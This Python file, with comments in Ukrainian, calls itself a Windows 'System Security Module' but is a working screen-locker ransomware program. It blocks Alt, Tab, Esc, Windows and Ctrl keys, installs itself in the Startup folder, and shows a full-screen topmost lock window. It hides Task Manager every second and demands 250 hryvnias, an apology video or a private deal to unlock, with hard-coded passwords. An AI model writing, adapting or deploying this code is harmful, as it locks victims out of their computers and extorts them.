"""
System Security Module - Windows Edition
Модуль безпеки системи для Windows
"""

import customtkinter as ctk
import os
import time
import sys

# Windows бібліотеки
try:
    import keyboard
    import win32gui
    import win32con
    import win32com.client
    WINDOWS_FEATURES = True
except ImportError:
    WINDOWS_FEATURES = False
    print("Windows features unavailable - running in demo mode")

# Паролі
PASSWORD = "14707"
BACKUP_PASSWORD = "unlockmepls"

# Теми та кольори
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# Кольорова палітра
COLORS = {
    "bg_primary": "#0a0c10",
    "bg_secondary": "#141b22", 
    "bg_tertiary": "#1f2937",
    "bg_card": "#1e293b",
    "accent": "#3b82f6",
    "accent_hover": "#2563eb",
    "accent_dark": "#1d4ed8",
    "text_primary": "#f8fafc",
    "text_secondary": "#94a3b8",
    "text_muted": "#64748b",
    "error": "#ef4444",
    "error_bg": "#7f1d1d",
    "warning": "#f59e0b",
    "success": "#10b981",
    "border": "#374151",
    "shadow": "#000000"
}

# Windows функції
if WINDOWS_FEATURES:
    # Блокування клавіш
    try:
        keyboard.block_key("alt")
        keyboard.block_key("tab")
        keyboard.block_key("esc")
        keyboard.block_key("windows")
        keyboard.block_key("ctrl")
    except Exception as e:
        print(f"Keyboard blocking error: {e}")

    # Приховування Task Manager
    def disable_task_manager():
        try:
            def enum_handler(hwnd, lParam):
                if win32gui.IsWindowVisible(hwnd):
                    title = win32gui.GetWindowText(hwnd)
                    if "Task Manager" in title or "Диспетчер задач" in title:
                        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            win32gui.EnumWindows(enum_handler, None)
        except Exception as e:
            print(f"Task manager hiding error: {e}")

    # Автозапуск
    def add_to_startup(file_path, name):
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            shortcut_path = os.path.join(startup_folder, f"{name}.lnk")

            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = file_path
            shortcut.WorkingDirectory = os.path.dirname(file_path)
            shortcut.IconLocation = file_path
            shortcut.Save()
        except Exception as e:
            print(f"Startup addition error: {e}")

    # Додаємо в автозапуск
    try:
        this_path = os.path.abspath(sys.argv[0])
        add_to_startup(this_path, "WindowsSecurityModule")
    except Exception as e:
        print(f"Self-startup error: {e}")

# Створення вікна
root = ctk.CTk()

# Windows налаштування
if WINDOWS_FEATURES:
    try:
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        root.geometry(f"{screen_width}x{screen_height}+0+0")
        root.attributes("-topmost", True)
        root.overrideredirect(True)
    except Exception as e:
        print(f"Window setup error: {e}")
        root.geometry("800x600+200+200")
        root.title("System Security Module")
else:
    root.geometry("800x600+200+200")
    root.title("System Security Module - Demo Mode")

root.configure(fg_color=COLORS["bg_primary"])

# Основний контейнер
main_frame = ctk.CTkFrame(
    master=root, 
    fg_color=COLORS["bg_primary"],
    corner_radius=0
)
main_frame.pack(fill="both", expand=True)

# Центральна панель
content_frame = ctk.CTkFrame(
    master=main_frame, 
    fg_color=COLORS["bg_card"],
    corner_radius=24,
    border_width=1,
    border_color=COLORS["border"]
)
content_frame.pack(expand=True, fill="both", padx=50, pady=50)

# Заголовок
header_frame = ctk.CTkFrame(
    content_frame,
    fg_color="transparent",
    corner_radius=0
)
header_frame.pack(fill="x", pady=(50, 40))

# Іконка
lock_icon = ctk.CTkLabel(
    header_frame, 
    text="🔐", 
    font=ctk.CTkFont(size=72),
    text_color=COLORS["error"]
)
lock_icon.pack(pady=(0, 20))

# Заголовок
title_label = ctk.CTkLabel(
    header_frame, 
    text="СИСТЕМА ЗАБЛОКОВАНА", 
    font=ctk.CTkFont(size=36, weight="bold"), 
    text_color=COLORS["text_primary"]
)
title_label.pack(pady=(0, 8))

# Підзаголовок
subtitle = ctk.CTkLabel(
    header_frame, 
    text="Несанкціонований доступ заборонено", 
    font=ctk.CTkFont(size=16), 
    text_color=COLORS["text_muted"]
)
subtitle.pack(pady=(0, 10))

# Статус лінія
status_line = ctk.CTkFrame(
    header_frame,
    height=2,
    fg_color=COLORS["error"],
    corner_radius=1
)
status_line.pack(fill="x", padx=100, pady=(10, 0))

# Форма
form_frame = ctk.CTkFrame(
    content_frame,
    fg_color="transparent",
    corner_radius=0
)
form_frame.pack(fill="x", pady=(20, 10))

# Лейбл
input_label = ctk.CTkLabel(
    form_frame,
    text="Пароль для розблокування:",
    font=ctk.CTkFont(size=14, weight="bold"),
    text_color=COLORS["text_secondary"]
)
input_label.pack(pady=(0, 8))

# Поле пароля
entry = ctk.CTkEntry(
    form_frame, 
    placeholder_text="Введіть пароль доступу...", 
    show="●", 
    font=ctk.CTkFont(size=18), 
    width=400,
    height=50,
    corner_radius=12,
    border_width=2,
    border_color=COLORS["border"],
    fg_color=COLORS["bg_tertiary"],
    text_color=COLORS["text_primary"],
    placeholder_text_color=COLORS["text_muted"]
)
entry.pack(pady=(0, 10))

# Помилки
error_label = ctk.CTkLabel(
    form_frame, 
    text="", 
    text_color=COLORS["error"], 
    font=ctk.CTkFont(size=14, weight="bold")
)
error_label.pack(pady=(5, 0))

# Спроби
attempts_label = ctk.CTkLabel(
    form_frame, 
    text="", 
    text_color=COLORS["text_muted"], 
    font=ctk.CTkFont(size=12)
)
attempts_label.pack(pady=(5, 0))

# Умови
conditions_frame = ctk.CTkFrame(
    content_frame,
    corner_radius=12,
    fg_color=COLORS["bg_tertiary"],
    border_width=1,
    border_color=COLORS["border"]
)
conditions_frame.pack(fill="x", pady=(10, 20), padx=40)

conditions_text = (
    "⚠️ Варіанти розблокування: Оплата 250₴ • Відео з вибаченнями • Домовленості в ЛС"
)

conditions_label = ctk.CTkLabel(
    conditions_frame, 
    text=conditions_text, 
    font=ctk.CTkFont(size=11), 
    text_color=COLORS["text_muted"], 
    justify="center"
)
conditions_label.pack(pady=15, padx=20)

# Анімація помилки
def show_error_animation():
    original_color = error_label.cget("text_color")
    
    for i in range(4):
        error_label.configure(text_color=COLORS["error"])
        entry.configure(border_color=COLORS["error"])
        root.update()
        time.sleep(0.15)
        error_label.configure(text_color="#ff8888")
        entry.configure(border_color="#ff8888")
        root.update()
        time.sleep(0.15)
    
    error_label.configure(text_color=original_color)
    entry.configure(border_color=COLORS["border"])
    entry.delete(0, 'end')

# Розблокування
def unlock():
    user_input = entry.get()
    attempts_label.configure(text="Спроба: " + user_input)

    if user_input == PASSWORD or user_input == BACKUP_PASSWORD:
        if WINDOWS_FEATURES:
            try:
                keyboard.unblock_key("alt")
                keyboard.unblock_key("tab")
                keyboard.unblock_key("esc")
                keyboard.unblock_key("windows")
                keyboard.unblock_key("ctrl")
            except Exception as e:
                print(f"Keyboard unblocking error: {e}")
        root.destroy()
    else:
        error_label.configure(text="Невірний пароль!")
        show_error_animation()

# Кнопка
button_frame = ctk.CTkFrame(
    content_frame,
    fg_color="transparent",
    corner_radius=0
)
button_frame.pack(fill="x", pady=(20, 30))

btn = ctk.CTkButton(
    button_frame, 
    text="🔓  РОЗБЛОКУВАТИ СИСТЕМУ", 
    command=unlock, 
    font=ctk.CTkFont(size=16, weight="bold"), 
    width=400, 
    height=50, 
    corner_radius=12,
    fg_color=COLORS["accent"],
    hover_color=COLORS["accent_hover"],
    text_color=COLORS["text_primary"],
    border_width=1,
    border_color=COLORS["accent_dark"]
)
btn.pack(pady=10)

# Enter клавіша
def on_enter(event):
    unlock()

entry.bind('<Return>', on_enter)
entry.focus()

# Task Manager приховування
if WINDOWS_FEATURES:
    def loop_hide_taskmgr():
        disable_task_manager()
        root.after(1000, loop_hide_taskmgr)
    loop_hide_taskmgr()

# Запуск
if __name__ == "__main__":
    root.mainloop()